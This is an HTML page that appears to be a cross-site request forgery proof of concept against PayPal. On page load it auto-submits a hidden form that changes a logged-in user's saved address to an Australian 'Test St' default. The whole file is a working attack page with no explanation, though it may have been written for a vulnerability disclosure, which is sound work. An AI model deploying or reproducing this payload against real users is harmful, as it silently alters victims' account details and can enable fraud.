<html>
<head>


	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>

<script>
$(document).ready(function(){$("#address").submit();});
</script>
	
</head>
<body>
	<form id="address" method="post" action="https://www.paypal.com/myaccount/address"/>
		<input type="hidden" name="country" value="AU"/>
		<input type="hidden" name="street1" value="99"/>
		<input type="hidden" name="street2" value="Test St"/>
		<input type="hidden" name="city" value="test"/>
		<input type="hidden" name="stateOrProvince" value="NSW"/>
		<input type="hidden" name="postalCode" value="2208"/>
		<input type="hidden" name="state" value="NSW"/>
		<input type="hidden" name="countryCode" value="AU"/>
		<input type="hidden" name="zip" value="2208"/>
		<input type="hidden" name="isDefault" value=true/>
	</form>
</body>
</html>
